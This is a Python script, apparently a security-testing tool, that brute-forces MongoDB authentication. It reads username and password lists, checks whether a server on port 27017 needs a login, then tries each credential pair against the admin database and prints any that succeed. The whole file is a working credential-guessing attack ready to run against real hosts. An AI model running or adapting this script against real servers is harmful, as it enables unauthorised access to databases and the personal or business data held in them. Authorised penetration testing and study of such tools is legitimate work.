#!/usr/bin/python3
''' mongodb bruteforce script.

A script for bruteforcing mongodb

Test with the following commandline
python3 mongodb_brute.py 192.168.2.5  users.txt passwords.txt
'''
from pymongo import MongoClient, errors
import sys
from time import sleep


def execute_scan(host, userfile, passwordfile, port, connect_timeout, ssl):
    '''Execute the bruteforce scan
    :param str host: hosts (IP addresses, hostnames) comma separated
    :param str userfile: filename with usernames
    :param str passwordfile: filename with passwords
    :param int port : port number
    :param bool ssl: bool to set ssl
    :param bool use_subset: bool for subset of lists and slow connection
    '''

    # connect_timeout = 2
    # read_timeout = 2

    try:  # exceptions with files
        # open the Userfile in users list
        users = []
        with open(userfile) as file:
            for line in file:
                users.append(line.strip())

        passwords = []
        with open(passwordfile) as file:
            for line in file:
                passwords.append(line.strip())
    except Exception as FileError:
        print(FileError)

    login_mongodb(host, users, passwords, port, connect_timeout, ssl)


def check_mongodb(host, port, connect_timeout):
    """Function for checking if there is mongodb database running."""
    try:
        # create connection string
        con_str = f'{host}:{port}'
        # attempt to create a client instance of PyMongo driver
        client = MongoClient(host=[con_str],
                             serverSelectionTimeoutMS=(connect_timeout*1000))
        client.server_info()

    except errors.ServerSelectionTimeoutError:
        print('Time out')
        return False
    except Exception as err:
        print("unknow MongoDB error")
        print(err)
        return False
    else:
        return True


def login_mongodb(host, users, passwords, port, connect_timeout, ssl):
    """Function for logging in to mongodb."""
    # Check if MongoDB uses Authentication

    # Create connection without user and passwords
    con_str = f"mongodb://{host}:{port}"
    print(con_str)
    try:
        client = MongoClient(con_str, serverSelectionTimeoutMS=(connect_timeout*1000)) # noqa E501
        db = client.admin

        db.command("serverStatus")
        print("You are connected!")
        print(f'No credentials needed for {host}')
    except errors.ServerSelectionTimeoutError:
        # if mongodb is not available a timeout error will be shown
        # so brute force execution must be stopped
        print('Time out error')
    except errors.InvalidURI:
        print("Invalid mongodb uri")
    except Exception as err:
        if str(err) == 'command serverStatus requires authentication':
            print('MongoDB server requires autherisation')
            for user in users:
                for password in passwords:
                    sleep(1)
                    try:
                        # create connection string
                        con_str = f"mongodb://{user}:{password}@{host}:{port}"
                        print(con_str)

                        client = MongoClient(con_str, serverSelectionTimeoutMS=(connect_timeout*1000)) # noqa E501
                        db = client.admin

                        db.command("serverStatus")
                        print("You are connected!")
                        print(f'Credentials found: {user}:{password} on {host}') # noqa E501
                        client.close()
                    except errors.ServerSelectionTimeoutError:
                        # if mongodb is not available a timeout error will be shown
                        # so brute force execution must be stopped
                        print('Time out error')
                        break
                    except errors.InvalidURI:
                        print("Invalid mongodb uri")
                        break
                    except Exception as err:
                        if str(err) == 'Authentication failed.':
                            print('Wrong user id and password!!!')
                        else:
                            print("unknow MongoDB error")
                            print(err)
                            break
                else:
                    continue
                break
        else:
            print("unknow MongoDB error")
            print(err)


if len(sys.argv) != 4:
    print("Not enough arguments:\n" +
          'Usage: mongodb_login_brute.py target userfile passfile')
else:
    host = sys.argv[1]
    users = sys.argv[2]
    passw = sys.argv[3]
    ssl = False
    if check_mongodb(host, 27017, 3):
        print('Mongodb available continue with bruteforcing')
        execute_scan(host, users, passw, 27017, 1, ssl)
    else:
        print('No mongodb server available')
